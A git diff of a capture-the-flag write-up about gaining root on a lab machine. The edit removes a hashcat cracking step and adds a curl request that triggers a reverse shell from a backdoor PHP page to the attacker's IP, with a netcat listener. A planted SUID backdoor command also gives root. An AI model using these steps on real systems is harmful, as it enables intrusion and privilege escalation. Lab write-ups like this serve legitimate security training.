@@ -139,17 +139,38 @@ We don’t know the password, so on our shell as zeus, check file VIGQFQFMYOST.p
 
 ![image](https://user-images.githubusercontent.com/93153300/198897845-31ec9f74-b153-4782-bfe1-2954f33550e2.png)
 
-Found md5 hashed password: a7c5ffcf139742f52a5267c4a0674129\
-Use hashcat to crack the hash and get the password.  First, save the hash in a file (I’ll call the file hash).  Next crack the hash:\
-hashcat -m 0 hash /usr/share/wordlists/rockyou.txt\
-Cracked, the passowrd is ‘secured’.
+Found the password: a7c5ffcf139742f52a5267c4a0674129\
+Back to the website, enter the password ‘a7c5ffcf139742f52a5267c4a0674129’. It works, the page now shows:
 
-Reading the code further in file VIGQFQFMYOST.php shows a command to run that will get us root:
+![image](https://user-images.githubusercontent.com/93153300/198901456-7f6f66cb-f4bc-4135-aeba-c87d68e2ff0d.png)
+ 
+Looks like instructions to get a reverse shell.  Looking back at file VIGQFQFMYOST.php:
+
+![image](https://user-images.githubusercontent.com/93153300/198901467-cf0e216b-fb04-4373-8ecc-1220e01b7511.png)
+ 
+The source code shows that to get a reverse shell we need to send a request, send the correct password, and open a netcat listener.  Based on the source code, our curl request should look like this:\
+curl "http://10.10.123.224/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php?ip=10.2.1.148&port=443" --data "password=a7c5ffcf139742f52a5267c4a0674129"
+
+Open netcat listener: nc -lvp 443.  → Run the curl request → we have shell as root:
+
+![image](https://user-images.githubusercontent.com/93153300/198901474-5854cd16-98dd-480d-a48a-c969edeb30d0.png)
+
+
+
+
+
+
+
+
+
+
+
+Another way of getting root:\
+The source code in file VIGQFQFMYOST.php shows a command that we can run from our zeus shell that will get us root:
 
 ![image](https://user-images.githubusercontent.com/93153300/198897851-c4aa05da-3d18-45cf-ba55-9d1c037425fd.png)
 
-The code shows that we can get root by running command “uname -a; w; $suid_bd”\
-Turns out we don’t need the password we cracked or to navigate to the webpage.  From zeus shell, run command:  uname -a; w; $suid_bd\
+From zeus shell, run command:  uname -a; w; $suid_bd\
 We have shell as root, get the flag: cat /root/root.flag.\
 We get the flag and some additional information.  The file root.flag says: \
 “PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)”
@@ -163,4 +184,4 @@ Ssh into target as root:\
 ssh -i id_rsa_roottarget root@10.10.105.247
 
 Search for the final flag with command: \
-grep -riI "flag{" 2>/dev/null  		→ 	Found the flag in etc/ssl/private/.b0nus.fl4g
+grep -riI "flag{" 2>/dev/null           →       Found the flag in etc/ssl/private/.b0nus.fl4g
